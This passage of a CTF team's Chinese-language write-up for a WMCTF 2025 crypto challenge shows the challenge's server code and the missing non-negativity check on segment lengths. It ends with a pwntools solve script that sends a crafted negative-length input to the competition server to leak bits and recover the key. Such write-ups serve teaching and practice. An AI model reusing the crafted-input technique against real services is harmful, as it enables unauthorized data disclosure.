class="string">b&#x27;WMCTF&#123;test&#125;&#x27;</span></span><br><span class="line">            <span class="variable language_">self</span>.send(<span class="string">b&quot;Welcome to WMCTF2025&quot;</span>)</span><br><span class="line">            key = getPrime(<span class="number">512</span>)</span><br><span class="line">            <span class="built_in">print</span>(key)</span><br><span class="line">            q = getPrime(<span class="number">512</span>)</span><br><span class="line">            <span class="variable language_">self</span>.send(<span class="string">b&quot;q:&quot;</span>+<span class="built_in">str</span>(q).encode())</span><br><span class="line">            <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">20</span>):</span><br><span class="line">                a = getPrime(<span class="number">512</span>)</span><br><span class="line">                b = a * key % q</span><br><span class="line">                gift = split_master(b, <span class="built_in">list</span>(<span class="built_in">map</span>(<span class="built_in">int</span>, <span class="variable language_">self</span>.recv(<span class="string">b&quot;&gt; &quot;</span>).split())))</span><br><span class="line">                <span class="variable language_">self</span>.send(<span class="string">b&quot;a:&quot;</span>+<span class="built_in">str</span>(a).encode())</span><br><span class="line">                <span class="variable language_">self</span>.send(<span class="string">b&quot;gift:&quot;</span>+<span class="built_in">str</span>(gift).encode())</span><br><span class="line">            x = <span class="variable language_">self</span>.recv(<span class="string">b&quot;the key to the flag is: &quot;</span>).decode()</span><br><span class="line">            <span class="keyword">if</span> x == <span class="built_in">str</span>(key):</span><br><span class="line">                <span class="variable language_">self</span>.send(flag)</span><br><span class="line">        <span class="keyword">except</span> socket.timeout:</span><br><span class="line">            <span class="variable language_">self</span>.send(<span class="string">b&quot;Time&#x27;s up!&quot;</span>)</span><br><span class="line">        <span class="keyword">finally</span>:</span><br><span class="line">            <span class="variable language_">self</span>.request.close()  <span class="comment"># 确保连接被关闭</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">ThreadedServer</span>(socketserver.ThreadingMixIn, socketserver.TCPServer):</span><br><span class="line">    <span class="keyword">pass</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&quot;__main__&quot;</span>:</span><br><span class="line"></span><br><span class="line">    HOST, PORT = <span class="string">&#x27;0.0.0.0&#x27;</span>, <span class="number">10003</span></span><br><span class="line"></span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;HOST:POST &quot;</span> + HOST + <span class="string">&quot;:&quot;</span> + <span class="built_in">str</span>(PORT))</span><br><span class="line">    server = ThreadedServer((HOST, PORT), Task)</span><br><span class="line">    server.allow_reuse_address = <span class="literal">True</span></span><br><span class="line">    server.serve_forever()</span><br></pre></td></tr></table></figure>

<p>代码太长而且有点复杂，让DeepSeek简单分析一下可以知道函数 <code>split_master</code> 的主要功能是处理一个十进制数 <code>B_decimal</code>，将其转换为 512 位的二进制字符串，并进行如下检查：</p>
<ul>
<li>检查 <code>segment_bits</code> 列表的长度是否至少为 3，如果不是，抛出 <code>ValueError</code> 异常，消息为 “no”。</li>
<li>检查 <code>segment_bits</code> 中所有位长度之和是否恰好为 512，如果不是，抛出 <code>ValueError</code> 异常，消息为 “no”。</li>
</ul>
<p>然后根据提供的 <code>segment_bits</code> 列表（指定各段的位长度）分割该字符串，并选择满足特定条件的段组合，它会尝试从 <code>segment_bits</code> 的索引中选择一个子集，满足以下条件：</p>
<ul>
<li>所选索引对应的段位长度之和不超过 30。</li>
<li>所选索引不能相邻（即任意两个索引的差值不能为 1）。</li>
<li>不能同时选择第一个索引（0）和最后一个索引（即列表的最后一个索引）。</li>
<li>每个所选段的位长度必须小于 25（即 <code>segment_bits[i] &lt; 25</code>）。</li>
</ul>
<p>最后搜索从最大可能的组合大小（即尽可能多的段）开始，逐步减小组合大小，直到找到满足条件的组合。如果找不到，抛出 <code>ValueError</code> 异常，消息为 “no”，最后根据选出的子集对<code>B_decimal</code>转换成的二进制串进行分割.</p>
<p>因为它没对<code>segment_bits</code> 的元素进行非负性检验，所以我们可以向其中传入负数，根据分析，如果我们传入<code>-3 1 1 513</code>，那么我们可以得到 $b$ 的高509位以及第二位，获取20组数据之后我们取出前两组数据，再爆破这两组数据中 $b$ 未知的两位（一共四位），并分别计算$key \equiv a^{-1} b \pmod{q}$，判断计算出的 $ke$ 是否相同即可.</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> sage.<span class="built_in">all</span> <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> itertools <span class="keyword">import</span> product</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">success</span>(<span class="params">s</span>):</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">f&quot;[+] <span class="subst">&#123;s&#125;</span>&quot;</span>)</span><br><span class="line"></span><br><span class="line">io = remote(<span class="string">&quot;62.234.144.69&quot;</span>, <span class="number">31737</span>)</span><br><span class="line"></span><br><span class="line">io.recvuntil(<span class="string">b&quot;q:&quot;</span>)</span><br><span class="line">q = <span class="built_in">int</span>(io.recvline().strip().decode())</span><br><span class="line">success(<span class="string">f&quot;<span class="subst">&#123;q = &#125;</span>&quot;</span>)</span><br><span class="line"></span><br><span class="line">a = []</span><br><span class="line">gift = []</span><br><span class="line"><span class="keyword">for</span> _ <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">20</span>):</span><br><span class="line">    io.sendlineafter(<span class="string">b&quot;&gt; &quot;</span>, <span class="string">b&quot;-3 1 1 513&quot;</span>)</span><br><span class="line">    io.recvuntil(<span class="string">b&quot;a:&quot;</span>)</span><br><span class="line">    a.append(<span class="built_in">int</span>(io.recvline().strip().decode()))</span><br><span class="line">    io.recvuntil(<span class="string">b&quot;gift:&quot;</span>)</span><br><span class="line">    g0, g1 = <span class="built_in">map</span>(<span class="built_in">int</span>, io.recvline().strip()[<span class="number">1</span>: -<span class="number">1</span>].decode().split(<span class="string">&#x27;,&#x27;</span>))</span><br><span class="line">    gift.append([g0, g1])</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> binlist <span class="keyword">in</span> product([<span class="number">0</span>, <span class="number">1</span>], repeat=<span class="number">4</span>):</span><br><span class="line">    b0, b1, b2, b3 = binlist</span><br><span class="line">    B0 = (gift[<span class="number">0</span>][<span class="number">0</span>] &lt;&lt; <span class="number">3</span>) + (b0 &lt;&lt; <span class="number">2</span>) + (gift[<span class="number">0</span>][<span class="number">1</span>] &lt;&lt; <span class="number">1</span>) + b1</span><br><span class="line">    B1 = (gift[<span class="number">1</span>][<span class="number">0</span>] &lt;&lt; <span class="number">3</span>) + (b2 &lt;&lt; <span class="number">2</span>) + (gift[<span class="number">1</span>][<span class="number">1</span>] &lt;&lt; <span class="number">1</span>) + b3</span><br><span class="line">    key1 = B0 * inverse_mod(a[<span class="number">0</span>], q) % q</span><br><span class="line">    key2 = B1 * inverse_mod(a[<span class="number">1</span>], q) % q</span><br><span class="line">    <span class="keyword">if</span> key1 == key2:</span><br><span class="line">        io.sendlineafter(<span class="string">b&quot;: &quot;</span>, <span class="built_in">str</span>(key1).encode())</span><br><span class="line">        <span class="keyword">break</span></span><br><span class="line">io.interactive()</span><br></pre></td></tr></table></figure>

</div><div class="article-licensing box"><div class="licensing-title"><p>2025 WMCTF SU WriteUp</p><p><a href="https://team-su.github.io/posts/f7c5eeeb.html">https://team-su.github.io/posts/f7c5eeeb.html</a></p></div><div class="licensing-meta level is-mobile"><div class="level-left"><div class="level-item is-narrow"><div><h6>Author</h6><p>SUers</p></div></div><div class="level-item is-narrow"><div><h6>Posted on</h6><p>2025-09-21</p></div></div><div class="level-item is-narrow"><div><h6>Updated on</h6><p>2025-09-21</p></div></div><div class="level-item is-narrow"><div><h6>Licensed under</h6><p><a class="icons" rel="noopener" target="_blank" title="Creative Commons" href="https://creativecommons.org/"><i class="icon fab fa-creative-commons"></i></a><a class="icons" rel="noopener" target="_blank" title="Attribution" href="https://creativecommons.org/licenses/by/4.0/"><i class="icon fab fa-creative-commons-by"></i></a><a class="icons" rel="noopener" target="_blank" title="Noncommercial" href="https://creativecommons.org/licenses/by-nc/4.0/"><i class="icon fab fa-creative-commons-nc"></i></a></p></div></div></div></div></div><div class="article-tags is-size-7 mb-4"><span class="mr-2">#</span><a class="link-muted mr-2" rel="tag" href="/tags/WMCTF/">WMCTF</a></div><!--!--></article></div><!--!--><nav class="post-navigation mt-4 level is-mobile"><div class="level-end"><a class="article-nav-next level level-item link-muted" href="/posts/a92a3cc3.html"><span class="level-item">2025 TFCCTF SU WriteUp</span><i class="level-item fas fa-chevron-right"></i></a></div></nav><!--!--></div><!--!--><div class="column column-right  order-3 is-sticky"><!--!--></div></div></div></section><footer class="footer"><div class="container"><div class="level"><div class="level-start"><a class="footer-logo is-block mb-2" href="/"><img src="/img/SU4.jpg" alt="su-team" height="28"></a><p class="is-size-7"><span>&copy; 2025 SUers</span>  Powered by <a href="https://hexo.io/" target="_blank" rel="noopener">Hexo</a> &amp; <a href="https://github.com/ppoffice/hexo-theme-icarus" target="_blank" rel="noopener">Icarus</a></p><p class="is-size-7">© 2016</p></div><div class="level-end"></div></div></div></footer><script src="https://cdn.jsdelivr.net/npm/jquery@3.3.1/dist/jquery.min.js"></script><script src="https://cdn.jsdelivr.net/npm/moment@2.22.2/min/moment-with-locales.min.js"></script><script src="https://cdn.jsdelivr.net/npm/clipboard@2.0.4/dist/clipboard.min.js" defer></script><script>moment.locale("en");</script><script>var IcarusThemeSettings = {
            article: {
                highlight: {
                    clipboard: true,
                    fold: 'unfolded'
                }
            }
        };</script><script data-pjax src="/js/column.js"></script><script src="/js/animation.js"></script><a id="back-to-top" title="Back to top" href="javascript:;"><i class="fas fa-chevron-up"></i></a><script data-pjax src="/js/back_to_top.js" defer></script><!--!--><!--!--><!--!--><script src="https://cdn.jsdelivr.net/npm/cookieconsent@3.1.1/build/cookieconsent.min.js" defer></script><script>window.addEventListener("load", () => {
      window.cookieconsent.initialise({
        type: "info",
        theme: "edgeless",
        static: false,
        position: "bottom-left",
        content: {
          message: "This website uses cookies to improve your experience.",
          dismiss: "Got it!",
          allow: "Allow cookies",
          deny: "Decline",
          link: "Learn more",
          policy: "Cookie Policy",
          href: "https://www.cookiesandyou.com/",
        },
        palette: {
          popup: {
            background: "#edeff5",
            text: "#838391"
          },
          button: {
            background: "#4b81e8"
          },
        },
      });
    });</script><script src="https://cdn.jsdelivr.net/npm/lightgallery@1.10.0/dist/js/lightgallery.min.js" defer></script><script src="https://cdn.jsdelivr.net/npm/justifiedGallery@3.8.1/dist/js/jquery.justifiedGallery.min.js" defer></script><script>window.addEventListener("load", () => {
            if (typeof $.fn.lightGallery === 'function') {
                $('.article').lightGallery({ selector: '.gallery-item' });
            }
            if (typeof $.fn.justifiedGallery === 'function') {
                if ($('.justified-gallery > p > .gallery-item').length) {
                    $('.justified-gallery > p > .gallery-item').unwrap();
                }
                $('.justified-gallery').justifiedGallery();
            }
        });</script><!--!--><!--!--><script type="text/javascript" id="MathJax-script" async>MathJax = {
      tex: {
        inlineMath: [['$', '$'], ['\\(', '\\)']]
      },
      svg: {
        fontCache: 'global'
      },
      chtml: {
        matchFontHeight: false
      }
    };</script><script src="https://cdn.jsdelivr.net/npm/mathjax@3.2.2/es5/tex-mml-chtml.js"></script><!--!--><!--!--><!--!--><script data-pjax src="/js/main.js" defer></script><!--!--></body></html>